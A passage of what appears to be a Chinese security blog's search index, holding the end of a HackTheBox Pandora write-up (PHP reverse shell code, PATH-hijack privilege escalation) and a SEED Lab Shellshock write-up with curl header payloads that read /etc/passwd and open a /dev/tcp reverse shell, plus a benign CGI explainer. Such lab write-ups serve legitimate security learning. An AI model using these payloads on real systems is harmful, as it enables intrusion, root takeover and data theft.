process&#x27;s STDERR</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div></div>我们只需要改变ip和所监听的端口即可，之后上传并访问该文件，我们便可以得到matt用户的shell。<h2 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h2><code>find / -perm -u=s 2&gt; /dev/null</code>：找到主机上面具有setuid权限的文件。<br><img src="https://s2.loli.net/2022/01/31/k46yLFl5ozcUmuT.png" alt="image.png"><br>发现<code>/usr/bin/pandora_backup</code>是用来进行备份的可执行文件，运行一下。直接运行<code>sudo /usr/bin/pandora_backup</code>发现报错，查看别人文章说是shell的问题，可以通过ssh获取一个更加稳定的shell。<h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><code>ssh-keygen</code>：创建公钥和私钥，passphrase可以不输入直接Enter不设置密码。<br><code>cat id_rsa.pub &gt;&gt; authorized_keys</code>：将生成的公钥加入到授权登录的列表里面。<br><code>chmod 600 authorized_keys</code>：更改权限。<br>在自己的主机上执行如下步骤：<br><code>touch id_rsa</code>：将该密钥放入到本地的一个文件中，作者创建了<em>id_rsa</em>。<br><code>chmod 600 id_rsa</code>：更改权限。<br><code>ssh matt@10.10.11.136 -i ./id_rsa</code>：通过本地<em>id_rsa</em>密钥文件以matt身份登录。<h3 id="setuid文件的利用"><a href="#setuid文件的利用" class="headerlink" title="setuid文件的利用"></a>setuid文件的利用</h3><code>python3 -m http.server 18000</code>在靶机上开启一个服务器，来把<em>pandora_backup</em>文件下载到本地进行调试。<br><code>gdb ./pandora_backup</code>启动调试。<br><img src="https://s2.loli.net/2022/01/31/65QloRWtiT1xKcn.png" alt="image.png"><br>发现调用了tar进行备份，所以我们可以在环境变量中插入我们自己的tar可执行文件路径。<br><code>echo &quot;/bin/bash&quot; &gt; tar</code><br><code>chmod +x ./tar</code><br><code>PATH=&quot;/home/matt&quot;:$&#123;PATH&#125;</code>：将我们的tar可执行文件的路径作为最先匹配的路径，命令的匹配是按环境变量所包含路径的顺序查找的。<br>最后执行<code>/usr/bin/pandora_backup</code>便可以获得root shell。<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><a href="https://zhuanlan.zhihu.com/p/458926451">https://zhuanlan.zhihu.com/p/458926451</a><br><a href="https://brainful.blog/2022/01/19/enumeration-2/">https://brainful.blog/2022/01/19/enumeration-2/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> Hackthebox </category>
          
          <category> easy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CGI学习</title>
      <link href="/2022/01/23/CGI%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/23/CGI%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CGI(Common Gateway Interface)严格来说是一个协议标准，不管是什么编程语言，只要符合该标准的规则就可以被称为CGI程序或者CGI脚本。<br>CGI是为Web服务器产生动态内容而创造的。在该标准出现前服务器所提供的都是静态内容，也就是存储在磁盘上面的文件，服务器在收到请求后直接将磁盘文件内容发送给客户端。而CGI出现之后，服务器就可以与后端的数据库进行交互。</p><h1 id="CGI工作原理"><a href="#CGI工作原理" class="headerlink" title="CGI工作原理"></a>CGI工作原理</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  flowchart TB    浏览器--HTTP请求&#x2F;cgi-bin&#x2F;hello.py--&gt;B[服务器]    B--HTTP响应--&gt;浏览器    B--调用并传递参数--&gt;C[CGI程序]    C--返回执行结果--&gt;B    C--请求--&gt;D[数据库]    D--响应--&gt;C  </pre></div><p>首先通过向浏览器中输入URL来向服务器请求CGI程序并传入参数。服务器在知道客户端要访问CGI程序后，会先fork一个新的shell进程然后运行/cgi-bin/hello.py这个CGI程序，CGI程序可以与后端的数据库进行一些交互并将最终的结果返回给服务器，服务器再发送给客户端。<br>这是一个大致的工作流程，但是其中有几个问题需要解决。服务器如何将参数传递给子进程？服务器如何将其他信息传递给子进程?CGI的执行结果如何返回给客户端？</p><ol><li>服务器会将URL后面跟随的参数赋值给环境变量<code>QUERY_STRING</code>，环境变量会传递给子进程，这样子进程便也可以访问传进来的参数。</li><li>服务器其他的一些信息，比如监听的端口、客户端IP地址等，同样的也会赋值给相应的环境变量并传递给子进程。</li><li>在子进程加载并运行CGI程序前，服务器会将标准输出重定向到与客户端相关联的套接字描述符，这样就会将输出的内容发送给客户端。需要注意的一点是，内容类型<code>Content-type</code>和长度<code>Content-length</code>都需要子进程来进行设置。<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2>接下来通过一个Apache服务器的例子来进一步说明工作的原理。<h3 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">apache:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">httpd:2.4</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;18008:80&quot;</span></span><br><span class="line">        <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;./:/tmp&quot;</span></span><br></pre></td></tr></table></figure><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3>开启Apache服务器的CGI，修改apache的配置文件conf目录下的httpd.conf。</li></ol><ul><li>注释掉<code>LoadModule cgid_module modules/mod_cgid.so</code>来加载CGI模块。</li><li><code>ScriptAlias &quot;/cgi-bin/&quot; &quot;/usr/local/apache2/cgi-bin/&quot;</code>将存放CGI程序的目录与URL访问路径映射起来，每当访问该路径时，服务器就会将所访问的文件视为CGI程序并尝试去执行。</li><li><code>AddHandler cgi-script .cgi .py</code>除了告诉服务器CGI程序存放的目录外，还要告诉服务器什么后缀的文件也应该被视为CGI程序。</li><li>在服务器目录下执行<code>bin/apachectl restart</code>来重启服务器加载配置文件。<br>更多的配置信息可以参考<a href="https://httpd.apache.org/docs/2.4/howto/cgi.html">官方链接</a><h3 id="CGI程序"><a href="#CGI程序" class="headerlink" title="CGI程序"></a>CGI程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;h1&gt;Hello from server!&lt;h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>C语言编写的一个简单的CGI程序。与之前描述的一样，我们需要先设置必要的部分，这里设置了MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展类型）为html，并且按照格式以一个新的空行标志响应报头的结束，后面跟上响应主体也就是我们想要发送的信息。<h3 id="访问CGI程序"><a href="#访问CGI程序" class="headerlink" title="访问CGI程序"></a>访问CGI程序</h3>浏览器输入<code>http://ip:18008/cgi-bin/hello</code>来访问编译好的CGI程序。<br><img src="https://s2.loli.net/2022/01/25/DuIAoMG9CQlOT71.png" alt="image.png"><br>服务器成功地返回了信息。<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1>CGI是一个很古远的技术了，现在的前后端界限已经没有那么清晰了，比如Node.js是一个基于JavaScript的运行时环境而JavaScript本身属于前端语言的范畴。但是学习一下CGI可以帮助我们理解前后端以及Web服务器之间是如何进行交互的，这样当我们在学习一些更加复杂的技术时可以帮助我们更快的入门。<br>接下来计划继续完善该文章，介绍一些CGI的改进版本。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础原理 </category>
          
          <category> Web服务器 </category>
          
          <category> CGI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGI </tag>
            
            <tag> 动态内容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seedlab-Shellshock</title>
      <link href="/2022/01/23/shellshock/"/>
      <url>/2022/01/23/shellshock/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Shellshock是于2014年发现与bash相关的漏洞，漏洞原因是因为bash在解析函数变量时所调用的解析函数，会将<strong>分号</strong>隔开的语句当作指令而执行，从而造成命令执行。<br><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/">本实验原地址</a></p><h1 id="Web服务器与CGI"><a href="#Web服务器与CGI" class="headerlink" title="Web服务器与CGI"></a>Web服务器与CGI</h1><p>许多的Web服务器（Apache和nginx等）开启了CGI，来为web应用生成动态的内容。许多的CGI程序是shell脚本，所以在CGI程序运行前，Web服务器会首先fork一个新的shell程序并将HTTP请求中的一些内容设置为环境变量引入，需要用户进行HTTP请求来触发该CGI程序。<br>需要补充一点的是，CGI程序不仅可以是shell脚本，其他的一些可以接收输入的编程语言比如php等，也可以作为CGI程序来进行解析。</p><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><h2 id="熟悉shell函数"><a href="#熟悉shell函数" class="headerlink" title="熟悉shell函数"></a>熟悉shell函数</h2><p>Ubuntu20.04中的bash程序已经被修复，无法再实施攻击。该实验在虚拟机的<mark class="hl-label blue">/bin</mark> 和压缩包的<mark class="hl-label blue">image_www</mark> 目录下安装了一个存在漏洞的bash程序。</p><h3 id="编写一个存在漏洞的shell函数"><a href="#编写一个存在漏洞的shell函数" class="headerlink" title="编写一个存在漏洞的shell函数"></a>编写一个存在漏洞的shell函数</h3><p>正常情况下shell函数的编写：<br><code>foo() &#123; echo &quot;hello world!&quot;; &#125;</code></p><mark class="hl-label red">注意：</mark> 左大括号后面的空格不能丢。<p><code>declare -f foo</code>来输出定义的函数<br>通过直接在shell中输入函数名字即可调用。<br><code>unset -f foo</code>删除定义的函数<br>另一种shell函数的编写方法：<br>上一种方法编写的shell函数如果想要传入子进程,则需要执行<code>export -f foo</code>,也就是将export的函数定义作为环境变量传入子进程。这种方法的缺点就是，父进程必须是shell程序否则无法将函数转化为环境变量引入子进程。<br>还有一种方法是定义一个特殊的变量，如<code>foo=&#39;() &#123; echo &quot;hello world!&quot;; &#125;&#39;</code>，<strong>左大括号左右间的空格不能丢掉</strong>。然后将该变量作为环境变量引入子bash进程<code>export foo</code>，子进程的shell程序会将环境变量转换为它自己的shell变量，如果在转换过程中发现有以<code>() &#123;</code>开头的环境变量时，则会将其转换为shell函数。这样只需要通过一个环境变量即可以传递函数定义。<br>定义一个存在漏洞的shell函数：<br>第二种方法在将环境变量解析为函数时会解析并执行<code>;</code>分隔的shell命令。<br><code>hack=&#39;() &#123; echo &quot;bad shell func!;&quot;&#125;;echo &quot;hacker!\n&quot;&#39;</code><strong>注意分号</strong><br><img src="https://s2.loli.net/2022/01/22/MxNuOp7ef8QKFqD.png" alt="image.png"><br>不同bash的结果如上图所示。</p><h2 id="通过环境变量向bash传入数据"><a href="#通过环境变量向bash传入数据" class="headerlink" title="通过环境变量向bash传入数据"></a>通过环境变量向bash传入数据</h2><div class="note primary simple"><p>Shellshock如果需要成功，需要满足以下两个条件：<br>1.触发bash调用<br>2.将用户输入作为环境变量</p></div><p>方便查看环境变量的CGI程序<mark class="hl-label blue">getenv.cgi</mark> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash_shellshock</span><br><span class="line"></span><br><span class="line">echo &quot;Content-type: text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;****** Environment Variables ******&quot;</span><br><span class="line">strings /proc/$$/environ</span><br></pre></td></tr></table></figure><p><code>$$</code>会被替换为当前的进程ID</p><h3 id="使用浏览器"><a href="#使用浏览器" class="headerlink" title="使用浏览器"></a>使用浏览器</h3><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器返回内容</span></div>    <div class="hide-content"><p>****** Environment Variables ******<br>HTTP_HOST=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0<br>HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5<br>HTTP_ACCEPT_ENCODING=gzip, deflate<br>HTTP_CONNECTION=keep-alive<br>HTTP_UPGRADE_INSECURE_REQUESTS=1<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at <a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a> Port 80</address><br>SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)<br>SERVER_NAME=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>SERVER_ADDR=10.9.0.80<br>SERVER_PORT=80<br>REMOTE_ADDR=10.9.0.1<br>DOCUMENT_ROOT=/var/www/html<br>REQUEST_SCHEME=http<br>CONTEXT_PREFIX=/cgi-bin/<br>CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/<br>SERVER_ADMIN=webmaster@localhost<br>SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi<br>REMOTE_PORT=45228<br>GATEWAY_INTERFACE=CGI/1.1<br>SERVER_PROTOCOL=HTTP/1.1<br>REQUEST_METHOD=GET<br>QUERY_STRING=<br>REQUEST_URI=/cgi-bin/getenv.cgi<br>SCRIPT_NAME=/cgi-bin/getenv.cgi</p></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器可传入的环境变量</span></div>    <div class="hide-content"><ul><li>HTTP_USER_AGENT</li><li>HTTP_ACCEPT</li><li>HTTP_ACCEPT_LANGUAGE</li><li>HTTP_ACCEPT_ENCODING</li><li>HTTP_HOST</li><li>HTTP_CONNECTION</li><li>HTTP_UPGRADE_INSECURE_REQUESTS</li></ul></div></div><h3 id="使用curl"><a href="#使用curl" class="headerlink" title="使用curl"></a>使用curl</h3><ul><li><code>-A</code>改变User-Agent字段</li><li><code>-e</code>改变Referer字段</li><li><code>-H</code>自定义头部，无值<code>Extra-Header;</code>,有值<code>Extra-Header: value</code><br>上面的三个选项均可以用来向环境变量中注入数据。<h2 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h2>目标URL：<a href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a><br>如果攻击命令执行结果是一个纯文本输出，并且我们想要该结果返回，则需要满足该协议：首先要以<code>echo &quot;Content-type: text/plain&quot;;</code>开头，后面跟随着一个空白行<code>echo;</code>，最后是我们想要执行的指令。<br>比如：<code>echo &quot;Content-type: text/plain&quot;;echo;/bin/ls -l</code><h3 id="服务器返回-etc-passwd的内容"><a href="#服务器返回-etc-passwd的内容" class="headerlink" title="服务器返回/etc/passwd的内容"></a>服务器返回/etc/passwd的内容</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/cat /etc/passwd&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="服务器返回当前的User-ID"><a href="#服务器返回当前的User-ID" class="headerlink" title="服务器返回当前的User ID"></a>服务器返回当前的User ID</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/id&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="在-tmp目录下创建新的文件"><a href="#在-tmp目录下创建新的文件" class="headerlink" title="在/tmp目录下创建新的文件"></a>在/tmp目录下创建新的文件</h3>使用-A选项<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/touch /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>查看创建的文件：<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/ls /tmp -l&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></li></ul><mark class="hl-label red">注意：</mark> 一次只能执行一个命令<h3 id="删除创建的文件"><a href="#删除创建的文件" class="headerlink" title="删除创建的文件"></a>删除创建的文件</h3><p>使用-e选项<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/rm /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><h3 id="问题回答"><a href="#问题回答" class="headerlink" title="问题回答"></a>问题回答</h3><p>1.不能读取/ect/shadow文件，因为只有root用户以及处于shadow用户组的用户才有读取权限<br>2.不可以（对于我来说）通过在GET请求的数据部分插入代码，这是因为<code>?</code>后面只能跟连续的字符串。curl中?后面加上空格会显示<strong>bad request</strong>,而进行一些编码等处理后会原封不动的赋值给环境变量，从而无法成功的进行解析。</p><h2 id="通过Shellshock创建反向shell"><a href="#通过Shellshock创建反向shell" class="headerlink" title="通过Shellshock创建反向shell"></a>通过Shellshock创建反向shell</h2><p>在发现服务器存在任意命令执行漏洞后，为了我们进一步的攻击往往需要创建一个交互式的shell。反向shell的原理在这里就不在说明。<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>最终成功的反弹了一个shell<br><img src="https://s2.loli.net/2022/01/23/HgPU8qkNlaI3KA9.png" alt="image.png"><br>作者在这里是直接反弹到了本地虚拟机的ens33端口，由于docker的网络配置其他IP地址可能不会成功反弹shell。</p><h2 id="使用打过补丁的Bash"><a href="#使用打过补丁的Bash" class="headerlink" title="使用打过补丁的Bash"></a>使用打过补丁的Bash</h2><p>修复之后的Bash会直接将函数后面的内容忽略掉，所以不会成功的执行上面命令。具体操作不再展示。</p><h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><p>对于Linux操作系统来说任何对象均为文件，建立的TCP连接也是一样的，不同编程语言版本的反向shell都是将标准输入、输出的文件描述符重定向到TCP连接的文件描述符从而实现远程控制。</p><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><h2 id="curl发送的编码问题"><a href="#curl发送的编码问题" class="headerlink" title="curl发送的编码问题"></a>curl发送的编码问题</h2><p>在GET请求的数据部分发送POC时大括号会消失:<br>原请求<code>curl -v &#39;http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?()+&#123;+echo+&quot;hello&quot;;+&#125;;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l&#39;</code><br>返回的内容<code>QUERY_STRING=()++echo+&quot;hello&quot;;+;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l</code><br>需要使用转义符号<code>\</code>进行转义。<br>GET请求中的一些特殊字符比如空格等，需要进行编码之后进行发送。<br>POST请求如果带有特殊字符可以使用<code>--data-urlencode</code>进行编码或者使用转义字符。</p>]]></content>
      
      
      <categories>
          
          <category> 国外课程 </category>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGI </tag>
            
            <tag> CVE </tag>
            
            <tag> bash </tag>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello</title>
      <link href="/2022/01/22/Hello/"/>
      <url>/2022/01/22/Hello/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>互联网上的小伙伴们，大家好！<br>这是我的第一个博客，在这里会记录我的学习过程。<br>希望里面的文章会对你有所帮助!</p><div class="note success modern"><p>Keep Learning!</p></div>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>books</title>
      <link href="/books/index.html"/>
      <url>/books/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>music</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>movies</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
